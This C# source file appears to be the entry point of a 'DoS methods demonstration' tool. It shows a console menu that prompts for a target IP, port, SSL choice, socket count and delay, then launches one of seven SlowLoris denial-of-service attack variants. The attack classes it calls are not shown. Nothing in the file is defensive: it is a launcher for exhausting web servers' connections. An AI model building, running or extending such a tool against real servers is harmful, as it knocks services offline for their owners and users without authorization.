using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace DoSMethodsDemonstration
{
    public class Program
    {
        static void Main(string[] args)
        {
            try
            {
                while (true)
                {
                    Console.WriteLine("\t[0] EXIT");
                    Console.WriteLine("\t[1] SlowLoris #1");
                    Console.WriteLine("\t[2] SlowLoris #2");
                    Console.WriteLine("\t[3] SlowLoris #3");
                    Console.WriteLine("\t[4] SlowLoris #4");
                    Console.WriteLine("\t[5] SlowLoris #5 (DISABLED)"); //https://github.com/seanmitch/slowloris
                    Console.WriteLine("\t[6] SlowLoris #6");
                    Console.WriteLine("\t[7] SlowLoris #7");
                    int selection = Convert.ToInt32(Console.ReadLine());
                    if (selection == 0)
                    {
                        Environment.Exit(-1);
                        Environment.FailFast(null);
                    }
                    else if (selection == 1)
                    {
                        SlowLoris1.Main();
                    }
                    else if (selection == 2)
                    {
                        Console.Write("IP: ");
                        string ip = Console.ReadLine();
                        Console.Write("PORT: ");
                        int port = Convert.ToInt32(Console.ReadLine());
                        Console.Write("Use SSL: ");
                        string tempanswer = Console.ReadLine();
                        bool useSsl = true;
                        if ((tempanswer.ToUpper().Contains("Y") || tempanswer.ToUpper().Contains("T")) && !tempanswer.ToUpper().Contains("F"))
                        {
                            useSsl = true;
                        }
                        else if (tempanswer.ToUpper().Contains("N") || tempanswer.ToUpper().Contains("F"))
                        {
                            useSsl = false;
                        }
                        Console.Write("COUNT: ");
                        int count = Convert.ToInt32(Console.ReadLine());
                        SlowLoris2.Attack(ip, port, useSsl, count);
                    }
                    else if (selection == 3)
                    {
                        Console.WriteLine(SlowLoris3.usage);
                        Console.Write("IP: ");
                        string ip = Console.ReadLine();
                        Console.Write("PORT: ");
                        int port = Convert.ToInt32(Console.ReadLine());
                        Console.Write("Use SSL: ");
                        string tempanswer = Console.ReadLine();
                        bool useSsl = true;
                        if ((tempanswer.ToUpper().Contains("Y") || tempanswer.ToUpper().Contains("T")) && !tempanswer.ToUpper().Contains("F"))
                        {
                            useSsl = true;
                        }
                        else if (tempanswer.ToUpper().Contains("N") || tempanswer.ToUpper().Contains("F"))
                        {
                            useSsl = false;
                        }
                        Console.Write("COUNT: ");
                        int count = Convert.ToInt32(Console.ReadLine());
                        Console.Write("DELAY: ");
                        int delay = Convert.ToInt32(Console.ReadLine());
                        SlowLoris3.Main(new string[] { ("ssl=" + useSsl.ToString()), ("port=" + port.ToString()), ("host=" + ip.ToString()), ("sockcount="  + count.ToString()), ("delay=" + delay.ToString()) });
                    }
                    else if (selection == 4)
                    {
                        SlowLoris4.Main();
                    }
                    else if (selection == 5)
                    {
                        Console.WriteLine("Not implemented. \n\thttps://github.com/seanmitch/slowloris\n");
                    }
                    else if (selection == 6)
                    {
                        Console.Write("IP: ");
                        string ip = Console.ReadLine();
                        Console.Write("PORT: ");
                        int port = Convert.ToInt32(Console.ReadLine());
                        Console.Write("COUNT: ");
                        int count = Convert.ToInt32(Console.ReadLine());
                        SlowLoris6.Main(new string[] { ip, port.ToString(), count.ToString()});
                    }
                    else if (selection == 7)
                    {
                        Console.Write("IP: ");
                        string ip = Console.ReadLine();
                        Console.Write("DELAY: ");
                        int delay = Convert.ToInt32(Console.ReadLine());
                        var cts = new CancellationTokenSource();
                        var slow = new SlowLoris7(ip, cts.Token, delay);
                        slow.Manage();

                    }
                    Console.WriteLine("PRESS ANY KEY TO CLEAR AND CHOOSE ANOTHER METHOD");
                    Console.Clear();
                }
            }
            catch
            {
                Console.WriteLine("\nALL OPERATIONS TERMINATED - PRESS ANY KEY TO EXIT");
                Console.ReadLine();
                Environment.Exit(-1);
                Environment.FailFast(null);
            }
        }
    }
}